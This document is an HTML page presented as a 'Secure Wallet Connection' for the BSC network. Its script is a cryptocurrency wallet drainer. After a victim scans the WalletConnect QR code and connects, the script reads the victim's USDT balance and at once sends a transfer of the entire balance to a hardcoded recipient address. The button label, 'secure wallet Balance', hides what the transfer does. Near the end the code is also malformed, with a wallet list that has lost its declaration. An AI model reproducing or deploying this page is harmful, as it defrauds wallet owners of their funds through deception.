<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Wallet Connection</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(160deg, #ffffff 0%, #eff6ff 30%, #dbeafe 60%, #1e3a8a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1e3a8a;
            overflow: hidden;
            position: relative;
        }

        /* Floating Wallet Background */
        .floating-wallets {
            position: fixed;
            inset: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 0;
        }

        .wallet-float {
            position: absolute;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            opacity: 0.18;
            animation: floatUp linear infinite;
        }

        .wallet-float svg {
            width: 40px;
            height: 40px;
        }

        .wallet-float span {
            font-size: 10px;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #1e3a8a;
            white-space: nowrap;
        }

        @keyframes floatUp {
            0% {
                transform: translateY(110vh) rotate(0deg);
                opacity: 0;
            }
            10% { opacity: 0.18; }
            90% { opacity: 0.18; }
            100% {
                transform: translateY(-20vh) rotate(360deg);
                opacity: 0;
            }
        }

        /* Ambient glow orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            pointer-events: none;
            z-index: 0;
        }
        .orb-1 {
            width: 500px; height: 500px;
            background: rgba(147, 197, 253, 0.35);
            top: -15%; left: -10%;
            animation: orbMove1 20s ease-in-out infinite;
        }
        .orb-2 {
            width: 400px; height: 400px;
            background: rgba(191, 219, 254, 0.3);
            bottom: -10%; right: -10%;
            animation: orbMove2 25s ease-in-out infinite;
        }
        .orb-3 {
            width: 300px; height: 300px;
            background: rgba(59, 130, 246, 0.15);
            top: 50%; left: 50%;
            animation: orbMove3 18s ease-in-out infinite;
        }

        @keyframes orbMove1 {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(120px, 100px); }
        }
        @keyframes orbMove2 {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(-100px, -80px); }
        }
        @keyframes orbMove3 {
            0%, 100% { transform: translate(-50%, -50%); }
            50% { transform: translate(-30%, -70%); }
        }

        /* Card */
        .card {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.82);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.6);
            border-radius: 24px;
            padding: 44px 36px;
            width: 100%;
            max-width: 440px;
            margin: 20px;
            text-align: center;
            box-shadow:
                0 0 0 1px rgba(147, 197, 253, 0.2),
                0 20px 60px rgba(30, 58, 138, 0.12),
                0 0 100px rgba(147, 197, 253, 0.15);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .card:hover {
            transform: translateY(-2px);
            box-shadow:
                0 0 0 1px rgba(147, 197, 253, 0.3),
                0 25px 70px rgba(30, 58, 138, 0.18),
                0 0 120px rgba(147, 197, 253, 0.2);
        }

        .logo {
            font-size: 11px;
            letter-spacing: 4px;
            color: rgba(30, 58, 138, 0.5);
            margin-bottom: 8px;
            font-weight: 600;
        }

        h1 {
            font-size: 22px;
            letter-spacing: 1.5px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #1e3a8a;
            line-height: 1.3;
        }

        .chain-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            letter-spacing: 1.5px;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(135deg, #3b82f6, #1e3a8a);
            padding: 4px 14px;
            border-radius: 20px;
            margin-bottom: 32px;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.25);
        }

        .qr-wrap {
            background: rgba(255, 255, 255, 0.7);
            border: 1px dashed rgba(59, 130, 246, 0.25);
            border-radius: 16px;
            padding: 28px;
            min-height: 280px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 14px;
            margin-bottom: 16px;
            position: relative;
            overflow: hidden;
        }
        .qr-wrap::before {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at center, rgba(147, 197, 253, 0.15) 0%, transparent 70%);
            pointer-events: none;
        }

        .qr-label {
            font-size: 10px;
            color: rgba(30, 58, 138, 0.5);
            letter-spacing: 2.5px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .qr-actions {
            display: none;
            gap: 10px;
            justify-content: center;
            margin-bottom: 20px;
        }
        .qr-actions.visible {
            display: flex;
        }

        .qr-btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            border-radius: 10px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: rgba(255, 255, 255, 0.6);
            color: #1e3a8a;
            font-family: inherit;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            backdrop-filter: blur(8px);
        }
        .qr-btn:hover {
            background: rgba(59, 130, 246, 0.1);
            border-color: rgba(59, 130, 246, 0.4);
            transform: translateY(-1px);
        }
        .qr-btn:active {
            transform: translateY(0);
        }
        .qr-btn svg {
            width: 16px;
            height: 16px;
        }

        .status-box {
            font-size: 13px;
            color: rgba(30, 58, 138, 0.7);
            margin-bottom: 20px;
            min-height: 24px;
            line-height: 1.6;
            font-weight: 500;
        }
        .status-box.error { color: #dc2626; }
        .status-box.warn  { color: #d97706; }
        .status-box.ok    { color: #059669; }

        .btn-send {
            display: none;
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #2563eb, #1e3a8a);
            color: #fff;
            font-family: inherit;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 1.5px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            margin-bottom: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.25);
            position: relative;
            overflow: hidden;
        }
        .btn-send::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
            transition: left 0.5s ease;
        }
        .btn-send:hover::before {
            left: 100%;
        }
        .btn-send:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.35);
        }
        .btn-send:active {
            transform: translateY(0);
        }
        .btn-send:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: rgba(30, 58, 138, 0.45);
            border-top: 1px solid rgba(147, 197, 253, 0.2);
            padding-top: 16px;
            font-weight: 500;
        }

        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(147, 197, 253, 0.2);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        a { color: #2563eb; text-decoration: none; transition: color 0.2s; }
        a:hover { color: #1e40af; text-decoration: underline; }

        /* Pulse ring animation for QR area */
        .pulse-ring {
            position: absolute;
            width: 100px;
            height: 100px;
            border: 2px solid rgba(59, 130, 246, 0.15);
            border-radius: 50%;
            animation: pulse 2s ease-out infinite;
            pointer-events: none;
        }
        @keyframes pulse {
            0% { transform: scale(0.5); opacity: 1; }
            100% { transform: scale(2); opacity: 0; }
        }

        /* Toast notification */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #1e3a8a;
            color: #fff;
            padding: 12px 24px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 600;
            box-shadow: 0 10px 40px rgba(30, 58, 138, 0.3);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 100;
            pointer-events: none;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
    </style>
<base target="_blank">
</head>
<body>

<!-- Ambient Orbs -->
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="orb orb-3"></div>

<!-- Floating Wallets Background -->
<div class="floating-wallets" id="floatingWallets"></div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<div class="card">
    <div class="logo">NETWORK</div>
    <h1>Scan to Secure<br>Wallet Connection</h1>
    <span class="chain-badge">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
        BSC
    </span>

    <div class="qr-wrap">
        <div class="pulse-ring"></div>
        <div class="spinner" id="spinner"></div>
        <div id="qrCanvas" style="display:none"></div>
        <div class="qr-label" id="qrLabel"></div>
    </div>

    <div class="qr-actions" id="qrActions">
        <button class="qr-btn" onclick="copyQRImage()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            Copy QR
        </button>
        <button class="qr-btn" onclick="shareQR()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
            Forward
        </button>
    </div>

    <div class="status-box warn" id="status">Initializing WalletConnect v2...</div>

    <button class="btn-send" id="btnSend" onclick="sendUSDT()">
        secure wallet Balance
    </button>

    <div class="info-row">
        <span id="balanceInfo">Balance: —</span>
        <span id="addrInfo">Not connected</span>
    </div>
</div>

<script type="module">
import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';

const RECIPIENT = "0xe0b8334e223B6F8E310209e2B6C0dcc884C6A23b";
const USDT_ADDR = "0xBE7A1Cde6E6815826b675Ef71c8BA785bff58888";
const PROJECT_ID = "9b0ce1ead8ab25a313e9942a4809a40f";
const RPC = "https://bsc-dataseed1.binance.org/";
const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address,uint256) returns (bool)",
    "function decimals() view returns (uint8)"
];

let wcProvider, ethersProvider, signer, userAddress;
let storedBalance, storedDecimals;
let currentQRUri = '';

function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2500);
}

function setStatus(msg, cls = '') {
    const el = document.getElementById('status');
    el.innerHTML = msg;
    el.className = 'status-box ' + cls;
}

function showQR(uri) {
    currentQRUri = uri;
    document.getElementById('spinner').style.display = 'none';
    const wrap = document.getElementById('qrCanvas');
    wrap.style.display = 'block';
    wrap.innerHTML = '';
    new QRCode(wrap, {
        text: uri,
        width: 240, height: 240,
        colorDark: "#1e3a8a",
        colorLight: "#ffffff",
        correctLevel: QRCode.CorrectLevel.M
    });
    document.getElementById('qrLabel').textContent = 'SECURE WALLET';
    document.getElementById('qrActions').classList.add('visible');
    setStatus('Waiting for scan...', 'warn');
}

window.copyQRImage = async function() {
    const qrWrap = document.getElementById('qrCanvas');
    const img = qrWrap.querySelector('img');
    const canvas = qrWrap.querySelector('canvas');

    try {
        let blob;
        if (img) {
            const resp = await fetch(img.src);
            blob = await resp.blob();
        } else if (canvas) {
            blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        } else {
            showToast('No QR image found');
            return;
        }

        await navigator.clipboard.write([
            new ClipboardItem({ 'image/png': blob })
        ]);
        showToast('QR image copied!');
    } catch (err) {
        // Fallback: copy URI as text
        try {
            await navigator.clipboard.writeText(currentQRUri);
            showToast('Connection link copied!');
        } catch (e2) {
            showToast('Copy failed');
        }
    }
};

window.shareQR = async function() {
    const qrWrap = document.getElementById('qrCanvas');
    const img = qrWrap.querySelector('img');
    const canvas = qrWrap.querySelector('canvas');

    let files = [];
    try {
        if (img) {
            const resp = await fetch(img.src);
            const blob = await resp.blob();
            files = [new File([blob], 'wallet-connect-qr.png', { type: 'image/png' })];
        } else if (canvas) {
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
            files = [new File([blob], 'wallet-connect-qr.png', { type: 'image/png' })];
        }
    } catch (e) {
        // ignore
    }

    const shareData = {
        title: 'Secure Wallet Connection',
        text: 'Scan this QR code to connect your wallet securely.',
        url: currentQRUri || window.location.href
    };
    if (files.length) shareData.files = files;

    if (navigator.share) {
        try {
            await navigator.share(shareData);
        } catch (err) {
            if (err.name !== 'AbortError') {
                // Fallback
                await navigator.clipboard.writeText(currentQRUri || window.location.href);
                showToast('Link copied to share!');
            }
        }
    } else {
        try {
            await navigator.clipboard.writeText(currentQRUri || window.location.href);
            showToast('Link copied to share!');
        } catch (e) {
            showToast('Share not supported');
        }
    }
};

async function init() {
    try {
        wcProvider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            chains: [56],
            rpcMap: { 56: RPC },
            showQrModal: false,
            metadata: {
                name: "Nora Lee",
                description: "Pay here",
                url: window.location.origin,
                icons: []
            }
        });

        wcProvider.on("display_uri", (uri) => {
            showQR(uri);
        });

        wcProvider.on("connect", async () => {
            document.getElementById('qrCanvas').style.display = 'none';
            document.getElementById('qrLabel').textContent = '';
            document.getElementById('qrActions').classList.remove('visible');
            document.getElementById('spinner').style.display = 'block';
            setStatus('Connected! Fetching balance...', 'warn');

            ethersProvider = new ethers.providers.Web3Provider(wcProvider);
            signer = ethersProvider.getSigner();
            userAddress = await signer.getAddress();

            document.getElementById('addrInfo').textContent =
                userAddress.slice(0,6) + '...' + userAddress.slice(-4);

            const rpc = new ethers.providers.JsonRpcProvider(RPC);
            const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, rpc);
            storedDecimals = await usdt.decimals();
            storedBalance  = await usdt.balanceOf(userAddress);
            const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);

            document.getElementById('spinner').style.display = 'none';
            document.getElementById('balanceInfo').textContent =
                'Balance: ' + parseFloat(formatted).toFixed(2) + ' USDT';

            if (storedBalance.eq(0)) {
                setStatus('No USDT balance found.', 'error');
                return;
            }

            setStatus('Ready — ' + parseFloat(formatted).toFixed(2) + ' USDT available.', 'ok');
            document.getElementById('btnSend').style.display = 'block';

            sendUSDT();
        });

        wcProvider.on("disconnect", () => {
            setStatus('Wallet disconnected.', 'error');
            document.getElementById('btnSend').style.display = 'none';
        });

        await wcProvider.connect();

    } catch (err) {
        console.error(err);
        document.getElementById('spinner').style.display = 'none';
        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
    }
}

window.sendUSDT = async function() {
    const btn = document.getElementById('btnSend');
    btn.disabled = true;
    setStatus('Sending to wallet for approval...', 'warn');
    try {
        const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, signer);
        const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
        const tx = await usdt.transfer(RECIPIENT, storedBalance);
        setStatus('Confirming: <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
        const receipt = await tx.wait();
        if (receipt && receipt.status === 1) {
            setStatus('Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">View on BscScan</a>', 'ok');
            btn.style.display = 'none';
        } else {
            setStatus('Transaction reverted.', 'error');
            btn.disabled = false;
        }
    } catch (err) {
        const msg = err.message || String(err);
        setStatus(msg.includes('rejected') ? 'Rejected in wallet.' : 'Error: ' + msg.slice(0,80), 'error');
        btn.disabled = false;
    }
}

    { name: 'Trust', svg: '<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="2" width="20" height="20" rx="5" fill="#3375BB"/><path d="M12 6l6 3v6l-6 3-6-3V9l6-3z" fill="white" opacity="0.9"/><path d="M12 6l6 3-6 3-6-3 6-3z" fill="white" opacity="0.6"/></svg>' },
    { name: 'Coinbase', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#0052FF"/><path d="M12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="white"/></svg>' },
    { name: 'Rainbow', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="url(#rainbow)"/><defs><linearGradient id="rainbow" x1="0" y1="0" x2="24" y2="24"><stop offset="0%" stop-color="#FF6B6B"/><stop offset="50%" stop-color="#4ECDC4"/><stop offset="100%" stop-color="#45B7D1"/></linearGradient></defs><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z" fill="white"/></svg>' },
    { name: 'Phantom', svg: '<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="2" width="20" height="20" rx="6" fill="#AB9FF2"/><path d="M8 12h8M8 15h5" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>' },
    { name: 'Argent', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#FF875B"/><path d="M12 7l3 5h-6l3-5z" fill="white"/><path d="M12 17l-3-5h6l-3 5z" fill="white" opacity="0.5"/></svg>' },
    { name: 'Exodus', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#00BFFF"/><path d="M7 12l5-5 5 5-5 5-5-5z" fill="white"/></svg>' },

const container = document.getElementById('floatingWallets');

wallets.forEach((wallet, i) => {
    const el = document.createElement('div');
    el.className = 'wallet-float';
    el.innerHTML = wallet.svg + '<span>' + wallet.name + '</span>';
    el.style.left = (5 + (i * 6.5) % 90) + '%';
    el.style.animationDuration = (12 + Math.random() * 18) + 's';
    el.style.animationDelay = (Math.random() * 10) + 's';
    el.style.transform = 'scale(' + (0.7 + Math.random() * 0.6) + ')';
    container.appendChild(el);
});
